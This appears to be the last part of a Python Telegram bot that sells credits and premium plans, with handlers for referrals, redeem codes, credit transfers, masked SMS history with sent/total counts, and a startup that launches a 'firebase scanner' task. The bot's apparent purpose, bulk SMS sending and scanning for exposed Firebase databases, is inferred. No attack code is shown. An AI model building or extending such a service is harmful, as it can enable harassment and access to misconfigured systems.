    await msg.answer(f"✅ Referral credits set to <b>{c}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    path = os.path.abspath(__file__)
    if os.path.exists(path):
        await cq.message.reply_document(document=FSInputFile(path), caption=f"💾 Script Export ({_VERSION})")

# ========== USER HOME, CREDITS, REDEEM, REFER, STATS, HISTORY, TRANSFER ==========
@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if is_admin(uid, d):
        await cq.message.edit_text(unified_admin_panel_text(d, is_owner(uid, d)), reply_markup=unified_admin_kb(d, is_owner(uid, d)), parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits_cb(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    rem = get_premium_remaining_sec(uid, d)
    prem_line = f"\n💎 Plan: {fmt_remaining_validity(rem)}" if rem > 0 else ""
    await cq.answer(f"💰 Credits: {get_user_credits(uid, d)}{prem_line}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text("Redeem code bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:home")]))

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = (msg.text or "").strip().upper()
    await state.clear()
    info = d.get("redeem_codes", {}).get(code)
    if not info or info.get("uses_left", 0) <= 0 or uid in info.get("used_by", []):
        await msg.answer("❌ Invalid / expired / already used code!", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]))
        return
    add_credits(uid, int(info["credits"]), d)
    info["uses_left"] -= 1
    info.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(f"🎉 +{info['credits']} credits added!", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]))

@R.callback_query(F.data == "user:refer")
async def user_refer_cb(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    ref_amt = int(d.get("settings", {}).get("ref_credits", 2000) or 2000)
    save(d)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Refer & Earn</b>\n\n"
        f"🎁 Per Referral: <b>{ref_amt} Credits</b>\n"
        f"🎟 Code: <code>{code}</code>\n"
        f"🔗 Link: https://t.me/{me.username}?start={code}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="danger")]]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:stats")
async def user_stats_cb(cq: CallbackQuery):
    d = load()
    uid = cq.from_user.id
    u = d.get("users", {}).get(str(uid), {})
    rem = get_premium_remaining_sec(uid, d)
    await cq.message.edit_text(
        f"<b>Your Stats</b>\n\n💰 Credits : <b>{u.get('credits', 0)}</b>\n📤 Uses    : <b>{u.get('uses', 0)}</b>\n💎 Premium : <b>{fmt_remaining_validity(rem) if rem > 0 else 'None'}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="danger")]]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_hist_cb(cq: CallbackQuery):
    d = load()
    hist = d.get("sms_history", {}).get(str(cq.from_user.id), [])[-10:]
    lines = [f"{i}. [{fmt_time(h.get('timestamp', 0))}] <code>{mask_number(h.get('number', ''))}</code> ({h.get('sent', 0)}/{h.get('total', 0)})" for i, h in enumerate(reversed(hist), 1)]
    await cq.message.edit_text("<b>My SMS History</b>\n\n" + ("\n".join(lines) or "No history yet."), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="danger")]]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing_cb(cq: CallbackQuery):
    lines = [
        f"💰 <b>{_VERSION} — Premium Plans</b>\n",
        f"<b>{sc('credits')}</b>: {CREDIT_CONTACT_HANDLE} | <b>{sc('owner')}</b>: {SUPER_ADMIN_NAME} 👇\n",
    ]
    for t in PREMIUM_TIERS:
        lines.append(f"• <b>{t['label']}</b> — <code>₹{t['price']}</code>")
    rows = [
        [btn_url("ᴄᴏɴᴛᴀᴄᴛ @ᴛᴄxsᴜ ɴᴏᴡ", CREDIT_CONTACT_LINK, EMOJI_MONEY, "💳", style="success")],
        [btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="danger")],
    ]
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if get_user_credits(cq.from_user.id, d) < 2:
        await cq.answer("❌ Minimum 2 credits chahiye!", show_alert=True)
        return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text("Jis user ko credits bhejne hain uski User ID bhejo:", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:home")]))

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    try:
        tid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid ID bhejo.")
        return
    await state.update_data(tr_uid=tid)
    await state.set_state(S.transfer_credits_amount)
    half = get_user_credits(msg.from_user.id, load()) // 2
    await msg.answer(f"Kitne credits transfer karne hain? (Max {half}):")

@R.message(S.transfer_credits_amount)
async def user_transfer_amt(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amt = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Valid number bhejo.")
        return
    half = get_user_credits(uid, d) // 2
    tid = int((await state.get_data()).get("tr_uid", 0))
    if amt <= 0 or amt > half or not deduct_credits(uid, amt, d):
        await msg.answer(f"❌ Max {half} transfer kar sakte hain.")
        return
    add_credits(tid, amt, d)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Transferred <b>{amt}</b> credits to <code>{tid}</code>!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]]), parse_mode="HTML")

@R.callback_query(F.data == "user:random_video")
async def user_random_video_cb(cq: CallbackQuery):
    if not load().get("videos"):
        await cq.answer("Koi video available nahi hai!", show_alert=True)
        return
    await cq.answer("📹 Sending...")
    await send_random_video(cq.bot, cq.message.chat.id, caption="📹 Enjoy!")

@R.callback_query(F.data == "user:info")
async def user_info_cb(cq: CallbackQuery):
    await cq.message.edit_text(
        f"<b>{_VERSION}</b>\n"
        f"<b>{sc('credits')}</b>: <a href='{CREDIT_CONTACT_LINK}'>{CREDIT_CONTACT_HANDLE}</a>\n"
        f"<b>{sc('owner')}</b>: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [btn_url("ᴄᴏɴᴛᴀᴄᴛ @ᴛᴄxsᴜ ɴᴏᴡ", CREDIT_CONTACT_LINK, EMOJI_MONEY, "💳", style="success")],
                [btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="danger")],
            ]
        ),
        parse_mode="HTML",
        disable_web_page_preview=True,
    )

@R.callback_query(F.data == "noop")
async def noop_cb(cq: CallbackQuery):
    await cq.answer()

# ========== ENTRYPOINT ==========
async def main():
    d = load()
    save(d)
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    me = await bot.get_me()
    log.info(f"@{me.username} — {_VERSION} started on {_DATA_FILE}")

    asyncio.create_task(background_firebase_scanner(bot))
    asyncio.create_task(auto_notification_loop(bot))

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>{_VERSION} Online!</b>\n"
            f"💾 DB Path: <code>{_DATA_FILE}</code>\n"
            f"🔄 Auto Notif: <b>READY ({fmt_interval_label(d.get('auto_broadcast', {}).get('interval_minutes', 5))})</b>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
